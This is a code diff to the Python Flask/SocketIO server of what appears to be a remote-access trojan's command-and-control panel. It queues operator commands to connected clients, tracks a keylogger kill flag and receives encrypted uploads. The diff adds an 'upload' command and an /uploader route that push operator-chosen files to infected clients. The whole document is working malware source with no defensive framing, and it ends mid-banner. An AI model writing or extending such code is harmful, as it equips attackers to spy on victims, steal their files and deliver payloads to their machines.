@@ -1,10 +1,11 @@
 import os
 import threading
 import time
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, send_file, abort
 from flask_socketio import SocketIO
 import base64
 import datetime
+import requests
 
 import rsa
 
@@ -12,6 +13,7 @@ app = Flask(__name__)
 socketio = SocketIO(app)
 
 COMMANDS = {}
+DOWNLOADFILE = ""
 kill_keylogger = False
 
 def decrypt1(encrypted:str):
@@ -92,6 +94,29 @@ def file_save(enc, fname):
         os.mkdir("./upload")
         file_save(enc, fname)
 
+def handle_uploader(message):
+    global DOWNLOADFILE
+    try:
+        filename = message.split(" ")[1]
+        if os.path.isfile(filename):
+            DOWNLOADFILE = filename
+            print(DOWNLOADFILE)
+            return True
+        else:
+            print(f"File {filename} not found. Not sending command")
+            return False
+
+    except Exception as e:
+        print(f"Error in handle_uploader(): {e}")
+        return False
+
+@app.route('/uploader')
+def download_file():
+    try: return send_file(DOWNLOADFILE, as_attachment=True)
+    except Exception as e:
+        print(f"Error in download_file(): {e}")
+        return abort(404)
+
 @app.route('/upload', methods=['POST'])
 def upload_file():
     if 'image' not in request.files:
@@ -149,7 +174,7 @@ def handle_post_request():
         return 'Received the POST request successfully', 200
 
 @socketio.on('message')
-def handle_message(message):
+def handle_message(message:str):
     global COMMANDS, kill_keylogger
 
     print(f"Received message from WebSocket client: {message}")
@@ -256,17 +281,22 @@ def cmd_handler(message: str):
     if s[0].isdigit():
         i = int(s[0])
         if i <= len(keys):
-            COMMANDS[keys[i]].append(" ".join(s[1:]))
+            msg = " ".join(s[1: ])
+            if msg.startswith("upload"):
+                if not handle_uploader(message): return
+            COMMANDS[keys[i]].append(msg)
         else: print("Invalid number id")
     else:
         for k in keys:
+            if message.startswith("upload"):
+                if not handle_uploader(message): return
             COMMANDS[k].append(message)
 
 def start():
     socketio.run(app, host="0.0.0.0", port=8000)
 
 def stop_server():
-    socketio.stop()
+    os._exit(0)
 
 def asciiart():
     print("""\n██████████████████████████████████
